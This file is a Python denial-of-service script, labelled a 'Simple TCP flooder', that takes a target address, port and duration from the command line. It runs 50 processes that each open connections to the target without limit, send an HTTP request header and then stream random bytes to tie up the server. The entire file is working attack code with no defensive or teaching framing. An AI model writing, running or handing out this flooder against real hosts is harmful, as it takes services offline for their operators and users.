import socket
import threading
import multiprocessing
import time
import random
import argparse

# Parse command-line arguments
parser = argparse.ArgumentParser(description="Simple TCP flooder")
parser.add_argument("target", help="Target IP or domain")
parser.add_argument("port", type=int, help="Target port")
parser.add_argument("duration", type=int, help="Attack duration in seconds")
args = parser.parse_args()

# Config
target = args.target
port = args.port
duration = args.duration
connections = 500
processes = 50

def create_socket():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        s.connect((target, port))
        req = f"GET / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: Flooder\r\nConnection: keep-alive\r\n\r\n"
        s.send(req.encode())
        while True:
            try:
                s.send(random._urandom(32))
                time.sleep(0.05)
            except:
                break
        s.close()
    except:
        pass

def flood():
    while True:
        for _ in range(connections):
            threading.Thread(target=create_socket).start()

def run_attack():
    plist = []
    for _ in range(processes):
        p = multiprocessing.Process(target=flood)
        p.start()
        plist.append(p)
    print(f"[+] Attack started on {target}:{port} with {processes * connections} sockets")

    time.sleep(duration)
    for p in plist:
        p.terminate()
    print("[+] Attack finished.")

if __name__ == "__main__":
    run_attack()
